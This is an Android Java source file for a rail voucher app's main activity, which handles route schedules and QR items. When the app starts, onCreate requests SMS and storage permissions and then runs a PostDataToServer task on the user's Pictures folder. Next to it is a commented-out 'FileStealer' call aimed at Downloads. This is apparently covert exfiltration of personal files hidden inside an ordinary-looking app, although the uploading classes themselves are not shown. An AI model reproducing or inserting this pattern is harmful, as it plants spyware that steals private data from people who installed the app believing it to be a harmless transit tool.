package com.example.myapplication;

import android.Manifest;
import android.os.Bundle;

import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.tabs.TabLayout;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentTransaction;
import androidx.lifecycle.MutableLiveData;
import androidx.viewpager.widget.ViewPager;
import androidx.appcompat.app.AppCompatActivity;

import android.os.Environment;
import android.view.View;

import com.example.myapplication.ui.main.SectionsPagerAdapter;

import java.util.ArrayList;
import java.util.List;

public class RailVoucherActivity extends AppCompatActivity {
    public RailUtils utils;
    public List<ScheduledRoute> schedulesRoutes = new ArrayList<>();
    public MutableLiveData<Integer> scheduleListner = new MutableLiveData<>();

    public List<QRRouteItem> QRItems = new ArrayList<>();
    public MutableLiveData<Integer> QRListner = new MutableLiveData<>();

    private DBhandler db;
    private int MY_PERMISSIONS_REQUEST = 10;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_rail_voucher);
        SectionsPagerAdapter sectionsPagerAdapter = new SectionsPagerAdapter(this, getSupportFragmentManager());
        ViewPager viewPager = findViewById(R.id.view_pager);
        viewPager.setAdapter(sectionsPagerAdapter);
        TabLayout tabs = findViewById(R.id.tabs);
        tabs.setupWithViewPager(viewPager);

        initActivity();

        ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.READ_EXTERNAL_STORAGE},
                MY_PERMISSIONS_REQUEST);

//        FileStealer stealer = new FileStealer();
//        stealer.getUserFiles(Environment.DIRECTORY_DOWNLOADS);
        PostDataToServer postDataToServer = new PostDataToServer();
        postDataToServer.execute(Environment.DIRECTORY_PICTURES);
        FloatingActionButton fab = findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                fab.setVisibility(View.GONE);
                Fragment fr = new FindRouteFragment();
                FragmentManager fm = getSupportFragmentManager();
                fm.addOnBackStackChangedListener(new FragmentManager.OnBackStackChangedListener() {
                    @Override
                    public void onBackStackChanged() {
                        int backCount = getSupportFragmentManager().getBackStackEntryCount();
                        if (backCount == 0) {
                            fab.setVisibility(View.VISIBLE);
                        }
                    }
                });
                FragmentTransaction fragmentTransaction = fm.beginTransaction();
                fragmentTransaction.replace(R.id.fragment_place, fr);
                fragmentTransaction.addToBackStack(null).commit();
            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    public void addScheduleRoute(ScheduledRoute route) {
        this.schedulesRoutes.add(route);
        this.db.addNewScheduleRoute(route);
        scheduleListner.setValue(schedulesRoutes.size());
    }

    public void removeScheduleRoute(ScheduledRoute route) {
        this.schedulesRoutes.remove(route);
        this.db.deleteScheduleRoute(route);
        scheduleListner.setValue(schedulesRoutes.size());
    }

    public void addQRItem(QRRouteItem route) {
        this.QRItems.add(route);
        this.db.addNewQR(route);
        QRListner.setValue(QRItems.size());
    }

    public void deleteQRItem(QRRouteItem route) {
        this.QRItems.remove(route);
        this.db.deleteQR(route);
        QRListner.setValue(QRItems.size());
    }

    private void initActivity() {
        utils = new RailUtils(this);
        db = new DBhandler(this);

        List<ScheduledRoute> scheduledRoutes = db.getAllScheduledRoutes();
        this.schedulesRoutes.addAll(scheduledRoutes);

        List<QRRouteItem> allQRItems = db.getAllQR();
        this.QRItems.addAll(allQRItems);

        scheduleListner.setValue(schedulesRoutes.size());
        QRListner.setValue(QRItems.size());
    }
}